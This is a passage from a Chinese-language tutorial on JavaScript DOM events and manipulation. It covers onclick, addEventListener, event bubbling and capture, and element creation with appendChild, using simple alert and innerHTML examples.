<h4 id="通过-onclick-传递事件对象（event）"><a href="#通过-onclick-传递事件对象（event）" class="headerlink" title="通过 onclick 传递事件对象（event）"></a>通过 <code>onclick</code> 传递事件对象（<code>event</code>）</h4><p>获取有关事件的更多信息（如点击位置、目标元素等）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;button onclick=&quot;myFunction(event)&quot;&gt;点击我&lt;/button&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">  function myFunction(event) &#123;</span><br><span class="line">    alert(&#x27;点击位置：X = &#x27; + event.clientX + &#x27;, Y = &#x27; + event.clientY);</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>此例中，<code>event</code> 对象包含了有关点击事件的信息，如鼠标的 <code>clientX</code> 和 <code>clientY</code> 坐标</p>
<h4 id="使用-event-preventDefault-阻止默认行为"><a href="#使用-event-preventDefault-阻止默认行为" class="headerlink" title="使用 event.preventDefault()阻止默认行为"></a>使用 <code>event.preventDefault()</code>阻止默认行为</h4><p>阻止点击事件的默认行为（如点击链接时跳转、提交表单等）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;https://www.example.com&quot; onclick=&quot;preventDefaultAction(event)&quot;&gt;点击我&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">  function preventDefaultAction(event) &#123;</span><br><span class="line">    event.preventDefault();</span><br><span class="line">    alert(&#x27;默认行为已被阻止&#x27;);</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h4 id="使用-this-引用当前元素"><a href="#使用-this-引用当前元素" class="headerlink" title="使用 this 引用当前元素"></a>使用 <code>this</code> 引用当前元素</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;button onclick=&quot;showMessage(this)&quot;&gt;点击我&lt;/button&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">  function showMessage(button) &#123;</span><br><span class="line">    alert(&#x27;按钮的文本是：&#x27; + button.innerText);</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>例子中，<code>this</code> 代表按钮本身，<code>button.innerText</code> 获取按钮的文本内容</p>
<h3 id="addEventListener"><a href="#addEventListener" class="headerlink" title="addEventListener()"></a>addEventListener()</h3><p>是 JavaScript 中用于向元素添加事件监听器的方法。与 <code>onclick</code> 属性相比，<code>addEventListener()</code> 更加灵活和强大，它<strong>允许绑定多个事件监听器</strong>，并且能够更好地控制事件传播、捕获与冒泡机制</p>
<h4 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">element.addEventListener(event, function, useCapture);</span><br></pre></td></tr></table></figure>

<p>**<code>event</code>**：事件类型（如 <code>&quot;click&quot;</code>、<code>&quot;mouseover&quot;</code>、<code>&quot;keydown&quot;</code> 等）。</p>
<p>**<code>function</code>**：事件触发时执行的回调函数。</p>
<p>**<code>useCapture</code>**（可选）：一个布尔值，指定事件是应该在捕获阶段触发（<code>true</code>事件从文档的根节点到达目标元素），还是在冒泡阶段触发（<code>false</code>事件从目标元素返回到文档的根节点）。默认值为 <code>false</code>。</p>
<h4 id="基本用法-1"><a href="#基本用法-1" class="headerlink" title="基本用法"></a>基本用法</h4><h5 id="添加点击事件监听器"><a href="#添加点击事件监听器" class="headerlink" title="添加点击事件监听器"></a>添加点击事件监听器</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;button id=&quot;myButton&quot;&gt;点击我&lt;/button&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">  const button = document.getElementById(&#x27;myButton&#x27;);</span><br><span class="line"></span><br><span class="line">  // 添加点击事件监听器</span><br><span class="line">  button.addEventListener(&#x27;click&#x27;, function() &#123;</span><br><span class="line">    alert(&#x27;按钮被点击了！&#x27;);</span><br><span class="line">  &#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h5 id="传递事件对象"><a href="#传递事件对象" class="headerlink" title="传递事件对象"></a>传递事件对象</h5><p><code>addEventListener()</code> 方法会自动传递一个事件对象给回调函数，可以通过该对象获取更多关于事件的信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;button id=&quot;myButton&quot;&gt;点击我&lt;/button&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">  const button = document.getElementById(&#x27;myButton&#x27;);</span><br><span class="line"></span><br><span class="line">  button.addEventListener(&#x27;click&#x27;, function(event) &#123;</span><br><span class="line">    alert(&#x27;点击位置：X = &#x27; + event.clientX + &#x27;, Y = &#x27; + event.clientY);</span><br><span class="line">  &#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h5 id="使用-this-访问触发事件的元素"><a href="#使用-this-访问触发事件的元素" class="headerlink" title="使用 this 访问触发事件的元素"></a>使用 <code>this</code> 访问触发事件的元素</h5><p>在 <code>addEventListener()</code> 中，<code>this</code> 通常指向触发事件的元素。因此，可以使用 <code>this</code> 来访问该元素的属性</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;button id=&quot;myButton&quot;&gt;点击我&lt;/button&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">  const button = document.getElementById(&#x27;myButton&#x27;);</span><br><span class="line"></span><br><span class="line">  button.addEventListener(&#x27;click&#x27;, function() &#123;</span><br><span class="line">    alert(&#x27;按钮的文本是：&#x27; + this.innerText);</span><br><span class="line">  &#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h4 id="添加多个事件监听器"><a href="#添加多个事件监听器" class="headerlink" title="添加多个事件监听器"></a>添加多个事件监听器</h4><p><code>addEventListener()</code> 允许你为同一个元素添加多个事件监听器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;button id=&quot;myButton&quot;&gt;点击我&lt;/button&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">  const button = document.getElementById(&#x27;myButton&#x27;);</span><br><span class="line"></span><br><span class="line">  button.addEventListener(&#x27;click&#x27;, function() &#123;</span><br><span class="line">    alert(&#x27;第一个事件&#x27;);</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  button.addEventListener(&#x27;click&#x27;, function() &#123;</span><br><span class="line">    alert(&#x27;第二个事件&#x27;);</span><br><span class="line">  &#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>例子中，当按钮被点击时，两个警告框会依次弹出</p>
<h4 id="移除事件监听器"><a href="#移除事件监听器" class="headerlink" title="移除事件监听器"></a>移除事件监听器</h4><p>用 <code>removeEventListener()</code> 方法来移除已经添加的事件监听器。需要注意的是，<code>removeEventListener()</code> 只能移除通过 <code>addEventListener()</code> 添加的事件监听器，并且需要传递相同的事件类型和回调函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;button id=&quot;myButton&quot;&gt;点击我&lt;/button&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">  const button = document.getElementById(&#x27;myButton&#x27;);</span><br><span class="line"></span><br><span class="line">  function handleClick() &#123;</span><br><span class="line">    alert(&#x27;按钮被点击了！&#x27;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  button.addEventListener(&#x27;click&#x27;, handleClick);</span><br><span class="line"></span><br><span class="line">  // 移除事件监听器</span><br><span class="line">  button.removeEventListener(&#x27;click&#x27;, handleClick);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h1 id="JavaScript-HTML-DOM"><a href="#JavaScript-HTML-DOM" class="headerlink" title="JavaScript HTML DOM"></a>JavaScript HTML DOM</h1><h2 id="DOM-HTML"><a href="#DOM-HTML" class="headerlink" title="DOM HTML"></a>DOM HTML</h2><h3 id="查找-HTML-元素"><a href="#查找-HTML-元素" class="headerlink" title="查找 HTML 元素"></a>查找 HTML 元素</h3><h4 id="通过-id-找到-HTML-元素"><a href="#通过-id-找到-HTML-元素" class="headerlink" title="通过 id 找到 HTML 元素"></a>通过 id 找到 HTML 元素</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;p id=&quot;intro&quot;&gt;你好世界!&lt;/p&gt;</span><br><span class="line">&lt;p&gt;该实例展示了 &lt;b&gt;getElementById&lt;/b&gt; 方法!&lt;/p&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">x=document.getElementById(&quot;intro&quot;);</span><br><span class="line">document.write(&quot;&lt;p&gt;文本来自 id 为 intro 段落: &quot; + x.innerHTML + &quot;&lt;/p&gt;&quot;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h4 id="通过标签名找到-HTML-元素"><a href="#通过标签名找到-HTML-元素" class="headerlink" title="通过标签名找到 HTML 元素"></a>通过标签名找到 HTML 元素</h4><p>查找 id&#x3D;”main” 的元素，然后查找 id&#x3D;”main” 元素中的所有 <code>&lt;p&gt;</code> 元素</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;p&gt;你好世界!&lt;/p&gt;</span><br><span class="line">&lt;div id=&quot;main&quot;&gt;</span><br><span class="line">&lt;p&gt; DOM 是非常有用的。&lt;/p&gt;</span><br><span class="line">&lt;p&gt;该实例展示了  &lt;b&gt;getElementsByTagName&lt;/b&gt; 方法&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var x=document.getElementById(&quot;main&quot;);</span><br><span class="line">var y=x.getElementsByTagName(&quot;p&quot;);</span><br><span class="line">document.write(&#x27;id=&quot;main&quot;元素中的第一个段落为：&#x27; + y[0].innerHTML);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h4 id="通过类名找到-HTML-元素"><a href="#通过类名找到-HTML-元素" class="headerlink" title="通过类名找到 HTML 元素"></a>通过类名找到 HTML 元素</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;p class=&quot;intro&quot;&gt;你好世界!&lt;/p&gt;</span><br><span class="line">&lt;p&gt;该实例展示了 &lt;b&gt;getElementsByClassName&lt;/b&gt; 方法!&lt;/p&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">x=document.getElementsByClassName(&quot;intro&quot;);</span><br><span class="line">document.write(&quot;&lt;p&gt;文本来自 class 为 intro 段落: &quot; + x[0].innerHTML + &quot;&lt;/p&gt;&quot;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="改变HTML"><a href="#改变HTML" class="headerlink" title="改变HTML"></a>改变HTML</h3><h4 id="改变-HTML-输出流"><a href="#改变-HTML-输出流" class="headerlink" title="改变 HTML 输出流"></a>改变 HTML 输出流</h4><p>在 JavaScript 中，<code>document.write()</code> 可用于直接向 HTML 输出流写内容</p>
<blockquote>
<p>[!CAUTION]</p>
<p>绝对不要在文档(DOM)加载完成之后使用 document.write()。这会覆盖该文档</p>
</blockquote>
<h4 id="改变-HTML-内容"><a href="#改变-HTML-内容" class="headerlink" title="改变 HTML 内容"></a>改变 HTML 内容</h4><p>修改 HTML 内容的最简单的方法是使用 innerHTML 属性</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">document.getElementById(id).innerHTML=新的 HTML</span><br></pre></td></tr></table></figure>

<h4 id="改变-HTML-属性"><a href="#改变-HTML-属性" class="headerlink" title="改变 HTML 属性"></a>改变 HTML 属性</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">document.getElementById(id).attribute=新属性值</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250123193811849.png"></p>
<h2 id="DOM-CSS"><a href="#DOM-CSS" class="headerlink" title="DOM CSS"></a>DOM CSS</h2><h3 id="改变-HTML-样式"><a href="#改变-HTML-样式" class="headerlink" title="改变 HTML 样式"></a>改变 HTML 样式</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">document.getElementById(id).style.property=新样式</span><br></pre></td></tr></table></figure>

<h3 id="使用事件"><a href="#使用事件" class="headerlink" title="使用事件"></a>使用事件</h3><p>HTML DOM 允许我们通过触发事件来执行代码</p>
<p>比如事件：元素被点击。页面加载完成。输入框被修改。</p>
<p>下例改变字体颜色</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;h1 id=&quot;id1&quot;&gt;我的标题 1&lt;/h1&gt;</span><br><span class="line">&lt;button type=&quot;button&quot; onclick=&quot;document.getElementById(&#x27;id1&#x27;).style.color=&#x27;red&#x27;&quot;&gt;</span><br><span class="line">点我!&lt;/button&gt;</span><br></pre></td></tr></table></figure>

<p>下例使元素显示或消失</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;p id=&quot;p1&quot;&gt;这是一个文本。&lt;/p&gt;</span><br><span class="line">&lt;input type=&quot;button&quot; value=&quot;隐藏文本&quot; onclick=&quot;document.getElementById(&#x27;p1&#x27;).style.visibility=&#x27;hidden&#x27;&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;button&quot; value=&quot;显示文本&quot; onclick=&quot;document.getElementById(&#x27;p1&#x27;).style.visibility=&#x27;visible&#x27;&quot; /&gt;</span><br></pre></td></tr></table></figure>

<h2 id="DOM-事件"><a href="#DOM-事件" class="headerlink" title="DOM 事件"></a>DOM 事件</h2><h3 id="对事件做出反应"><a href="#对事件做出反应" class="headerlink" title="对事件做出反应"></a>对事件做出反应</h3><p>用户点击某个元素时执行代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;h1 onclick=&quot;this.innerHTML=&#x27;Ooops!&#x27;&quot;&gt;点击文本!&lt;/h1&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;h1 onclick=&quot;changetext(this)&quot;&gt;点击文本!&lt;/h1&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function changetext(id)&#123;</span><br><span class="line">	id.innerHTML=&quot;Ooops!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="HTML事件属性"><a href="#HTML事件属性" class="headerlink" title="HTML事件属性"></a>HTML事件属性</h3><p>如需向 HTML 元素分配 事件，可以使用事件属性</p>
<p>如向 button 元素分配 onclick 事件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;p&gt;点击按钮执行 &lt;em&gt;displayDate()&lt;/em&gt; 函数.&lt;/p&gt;</span><br><span class="line">&lt;button onclick=&quot;displayDate()&quot;&gt;点这里&lt;/button&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function displayDate()&#123;</span><br><span class="line">	document.getElementById(&quot;demo&quot;).innerHTML=Date();</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;p id=&quot;demo&quot;&gt;&lt;/p&gt;</span><br></pre></td></tr></table></figure>

<h3 id="使用HTML-DOM-来分配事件"><a href="#使用HTML-DOM-来分配事件" class="headerlink" title="使用HTML DOM 来分配事件"></a>使用HTML DOM 来分配事件</h3><p>如向 button 元素分配 onclick 事件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;p&gt;点击按钮执行 &lt;em&gt;displayDate()&lt;/em&gt; 函数.&lt;/p&gt;</span><br><span class="line">&lt;button id=&quot;myBtn&quot;&gt;点这里&lt;/button&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">document.getElementById(&quot;myBtn&quot;).onclick=function()&#123;displayDate()&#125;;</span><br><span class="line">function displayDate()&#123;</span><br><span class="line">	document.getElementById(&quot;demo&quot;).innerHTML=Date();</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;p id=&quot;demo&quot;&gt;&lt;/p&gt;</span><br></pre></td></tr></table></figure>

<p>上例中，名为 displayDate 的函数被分配给 id&#x3D;”myBtn” 的 HTML 元素。</p>
<p>按钮点击时Javascript函数将会被执行</p>
<h3 id="onload和onunload事件"><a href="#onload和onunload事件" class="headerlink" title="onload和onunload事件"></a>onload和onunload事件</h3><p>onload 和 onunload 事件会在用户进入或离开页面时被触发</p>
<blockquote>
<p>[!NOTE]</p>
<p>onload 事件可用于检测访问者的浏览器类型和浏览器版本，并基于这些信息来加载网页的正确版本。</p>
<p>onload 和 onunload 事件可用于处理 cookie</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;body onload=&quot;checkCookies()&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function checkCookies()&#123;</span><br><span class="line">	if (navigator.cookieEnabled==true)&#123;</span><br><span class="line">		alert(&quot;Cookies 可用&quot;)</span><br><span class="line">	&#125;</span><br><span class="line">	else&#123;</span><br><span class="line">		alert(&quot;Cookies 不可用&quot;)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;p&gt;弹窗-提示浏览器 cookie 是否可用。&lt;/p&gt;	</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>

<h3 id="onchange事件"><a href="#onchange事件" class="headerlink" title="onchange事件"></a>onchange事件</h3><p>onchange 事件常结合对输入字段的验证来使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">function myFunction()&#123;</span><br><span class="line">	var x=document.getElementById(&quot;fname&quot;);</span><br><span class="line">	x.value=x.value.toUpperCase();</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">输入你的名字: &lt;input type=&quot;text&quot; id=&quot;fname&quot; onchange=&quot;myFunction()&quot;&gt;</span><br><span class="line">&lt;p&gt;当你离开输入框后，函数将被触发，将小写字母转为大写字母。&lt;/p&gt;</span><br></pre></td></tr></table></figure>

<h3 id="onmouseover-和-onmouseout-事件"><a href="#onmouseover-和-onmouseout-事件" class="headerlink" title="onmouseover 和 onmouseout 事件"></a>onmouseover 和 onmouseout 事件</h3><p>onmouseover 和 onmouseout 事件可用于在用户的鼠标移至 HTML 元素上方或移出元素时触发函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div onmouseover=&quot;mOver(this)&quot; onmouseout=&quot;mOut(this)&quot;&gt;Mouse Over Me&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function mOver(obj)&#123;</span><br><span class="line">	obj.innerHTML=&quot;Thank You&quot;</span><br><span class="line">&#125;</span><br><span class="line">function mOut(obj)&#123;</span><br><span class="line">	obj.innerHTML=&quot;Mouse Over Me&quot;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="onmousedown、onmouseup-以及-onclick-事件"><a href="#onmousedown、onmouseup-以及-onclick-事件" class="headerlink" title="onmousedown、onmouseup 以及 onclick 事件"></a>onmousedown、onmouseup 以及 onclick 事件</h3><p>onmousedown, onmouseup 以及 onclick 构成了鼠标点击事件的所有部分。首先当点击鼠标按钮时，会触发 onmousedown 事件，当释放鼠标按钮时，会触发 onmouseup 事件，最后，当完成鼠标点击时，会触发 onclick 事件</p>
<h2 id="DOM-EventListener"><a href="#DOM-EventListener" class="headerlink" title="DOM EventListener"></a>DOM EventListener</h2><h3 id="addEventListener-方法"><a href="#addEventListener-方法" class="headerlink" title="addEventListener() 方法"></a>addEventListener() 方法</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;p&gt;该实例使用 addEventListener() 方法在按钮中添加点击事件。 &lt;/p&gt;</span><br><span class="line">&lt;button id=&quot;myBtn&quot;&gt;点我&lt;/button&gt;</span><br><span class="line">&lt;p id=&quot;demo&quot;&gt;&lt;/p&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">document.getElementById(&quot;myBtn&quot;).addEventListener(&quot;click&quot;, displayDate);</span><br><span class="line">function displayDate() &#123;</span><br><span class="line">    document.getElementById(&quot;demo&quot;).innerHTML = Date();</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">element.addEventListener(event, function, useCapture);</span><br></pre></td></tr></table></figure>

<p>第一个参数是事件的类型 (如 “click” 或 “mousedown”).</p>
<p>第二个参数是事件触发后调用的函数。</p>
<p>第三个参数是个布尔值用于描述事件是冒泡还是捕获。该参数是可选的。</p>
<h3 id="向原元素添加事件句柄"><a href="#向原元素添加事件句柄" class="headerlink" title="向原元素添加事件句柄"></a>向原元素添加事件句柄</h3><p>如当用户点击元素时弹出 “Hello World!” ：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;p&gt;该实例使用 addEventListener() 方法在按钮中添加点击事件。 &lt;/p&gt;</span><br><span class="line">&lt;button id=&quot;myBtn&quot;&gt;点我&lt;/button&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">document.getElementById(&quot;myBtn&quot;).addEventListener(&quot;click&quot;, function()&#123;</span><br><span class="line">    alert(&quot;Hello World!&quot;);</span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="向同一个元素中添加多个事件句柄"><a href="#向同一个元素中添加多个事件句柄" class="headerlink" title="向同一个元素中添加多个事件句柄"></a>向同一个元素中添加多个事件句柄</h3><p>addEventListener() 方法允许向同一个元素添加多个事件，且不会覆盖已存在的事件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;p&gt;该实例使用 addEventListener() 方法向同个按钮中添加两个点击事件。&lt;/p&gt;</span><br><span class="line">&lt;button id=&quot;myBtn&quot;&gt;点我&lt;/button&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var x = document.getElementById(&quot;myBtn&quot;);</span><br><span class="line">x.addEventListener(&quot;click&quot;, myFunction);</span><br><span class="line">x.addEventListener(&quot;click&quot;, someOtherFunction);</span><br><span class="line">function myFunction() &#123;</span><br><span class="line">    alert (&quot;Hello World!&quot;)</span><br><span class="line">&#125;</span><br><span class="line">function someOtherFunction() &#123;</span><br><span class="line">    alert (&quot;函数已执行!&quot;)</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>你可以向同个元素添加不同类型的事件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;p&gt;实例使用 addEventListener() 方法在同一个按钮中添加多个事件。&lt;/p&gt;</span><br><span class="line">&lt;button id=&quot;myBtn&quot;&gt;点我&lt;/button&gt;</span><br><span class="line">&lt;p id=&quot;demo&quot;&gt;&lt;/p&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var x = document.getElementById(&quot;myBtn&quot;);</span><br><span class="line">x.addEventListener(&quot;mouseover&quot;, myFunction);</span><br><span class="line">x.addEventListener(&quot;click&quot;, mySecondFunction);</span><br><span class="line">x.addEventListener(&quot;mouseout&quot;, myThirdFunction);</span><br><span class="line">function myFunction() &#123;</span><br><span class="line">    document.getElementById(&quot;demo&quot;).innerHTML += &quot;Moused over!&lt;br&gt;&quot;</span><br><span class="line">&#125;</span><br><span class="line">function mySecondFunction() &#123;</span><br><span class="line">    document.getElementById(&quot;demo&quot;).innerHTML += &quot;Clicked!&lt;br&gt;&quot;</span><br><span class="line">&#125;</span><br><span class="line">function myThirdFunction() &#123;</span><br><span class="line">    document.getElementById(&quot;demo&quot;).innerHTML += &quot;Moused out!&lt;br&gt;&quot;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="向-Window-对象添加事件句柄"><a href="#向-Window-对象添加事件句柄" class="headerlink" title="向 Window 对象添加事件句柄"></a>向 Window 对象添加事件句柄</h3><p>当用户重置窗口大小时添加事件监听：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">window.addEventListener(&quot;resize&quot;, function()&#123;</span><br><span class="line">    document.getElementById(&quot;demo&quot;).innerHTML = sometext;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h3 id="事件冒泡或事件捕获"><a href="#事件冒泡或事件捕获" class="headerlink" title="事件冒泡或事件捕获"></a>事件冒泡或事件捕获</h3><p>事件传递有两种方式：冒泡与捕获</p>
<p>事件传递定义了元素事件触发的顺序</p>
<p>将 <code>&lt;p&gt;</code> 元素插入到 <code>&lt;div&gt;</code> 元素中，用户点击 <code>&lt;p&gt;</code> 元素：</p>
<p>在 <em>冒泡</em> 中，内部元素的事件会先被触发，然后再触发外部元素，即： <code>&lt;p&gt;</code> 元素的点击事件先触发，然后会触发 <code>&lt;div&gt;</code> 元素的点击事件。</p>
<p>在 <em>捕获</em> 中，外部元素的事件会先被触发，然后才会触发内部元素的事件，即： <code>&lt;div&gt;</code> 元素的点击事件先触发 ，然后再触发 <code>&lt;p&gt;</code> 元素的点击事件。</p>
<p>addEventListener() 方法可以指定 “useCapture” 参数来设置传递类型：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">addEventListener(event, function, useCapture);</span><br></pre></td></tr></table></figure>

<p>默认值为 false, 即冒泡传递，当值为 true 时, 事件使用捕获传递</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;p&gt;实例演示了在添加不同事件监听时，冒泡与捕获的不同。&lt;/p&gt;</span><br><span class="line">&lt;div id=&quot;myDiv&quot;&gt;</span><br><span class="line">	&lt;p id=&quot;myP&quot;&gt;点击段落，我是冒泡。&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;&lt;br&gt;</span><br><span class="line">&lt;div id=&quot;myDiv2&quot;&gt;</span><br><span class="line">	&lt;p id=&quot;myP2&quot;&gt;点击段落，我是捕获。 &lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">&lt;!--冒泡--&gt;</span><br><span class="line">document.getElementById(&quot;myP&quot;).addEventListener(&quot;click&quot;, function() &#123;</span><br><span class="line">    alert(&quot;你点击了 P 元素!&quot;);</span><br><span class="line">&#125;, false);</span><br><span class="line">document.getElementById(&quot;myDiv&quot;).addEventListener(&quot;click&quot;, function() &#123;</span><br><span class="line">    alert(&quot; 你点击了 DIV 元素 !&quot;);</span><br><span class="line">&#125;, false);</span><br><span class="line">&lt;!--捕获--&gt;</span><br><span class="line">document.getElementById(&quot;myP2&quot;).addEventListener(&quot;click&quot;, function() &#123;</span><br><span class="line">    alert(&quot;你点击了 P2 元素!&quot;);</span><br><span class="line">&#125;, true);</span><br><span class="line">document.getElementById(&quot;myDiv2&quot;).addEventListener(&quot;click&quot;, function() &#123;</span><br><span class="line">    alert(&quot;你点击了 DIV2 元素 !&quot;);</span><br><span class="line">&#125;, true);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="removeEventListener-方法"><a href="#removeEventListener-方法" class="headerlink" title="removeEventListener() 方法"></a>removeEventListener() 方法</h3><p>removeEventListener() 方法移除由 addEventListener() 方法添加的事件句柄:</p>
<p><a href="https://www.runoob.com/jsref/dom-obj-event.html">HTML DOM 事件对象参考手册</a></p>
<h2 id="DOM-元素"><a href="#DOM-元素" class="headerlink" title="DOM 元素"></a>DOM 元素</h2><h3 id="创建新的-HTML-元素-节点"><a href="#创建新的-HTML-元素-节点" class="headerlink" title="创建新的 HTML 元素 (节点)"></a>创建新的 HTML 元素 (节点)</h3><p>要创建新的 HTML 元素 (节点)需要先创建一个元素，然后在已存在的元素中添加它</p>
<h4 id="appendChild"><a href="#appendChild" class="headerlink" title="appendChild()"></a>appendChild()</h4><p>是 JavaScript 中用于将一个节点（元素或文本节点）追加到指定父节点的最后一个子节点位置的方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div id=&quot;div1&quot;&gt;</span><br><span class="line">  &lt;!-- 这是父元素 --&gt;</span><br><span class="line">  &lt;p id=&quot;p1&quot;&gt;这是一个段落。&lt;/p&gt;</span><br><span class="line">  &lt;p id=&quot;p2&quot;&gt;这是另外一个段落。&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">  // 1. 找到父元素 div1</span><br><span class="line">  var parentElement = document.getElementById(&quot;div1&quot;);</span><br><span class="line"></span><br><span class="line">  // 2. 创建一个新的子元素 &lt;p&gt;</span><br><span class="line">  var childElement = document.createElement(&quot;p&quot;);</span><br><span class="line"></span><br><span class="line">  // 3. 创建子元素中的文本内容</span><br><span class="line">  var childText = document.createTextNode(&quot;这是一个新的段落。&quot;);</span><br><span class="line"></span><br><span class="line">  // 4. 将文本内容放入子元素中</span><br><span class="line">  childElement.appendChild(childText);</span><br><span class="line"></span><br><span class="line">  // 5. 将子元素添加到父元素中</span><br><span class="line">  parentElement.appendChild(childElement);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h4 id="insertBefore"><a href="#insertBefore" class="headerlink" title="insertBefore()"></a>insertBefore()</h4><p>用于在指定的父元素中，将一个新节点插入到某个已存在的子节点之前</p>
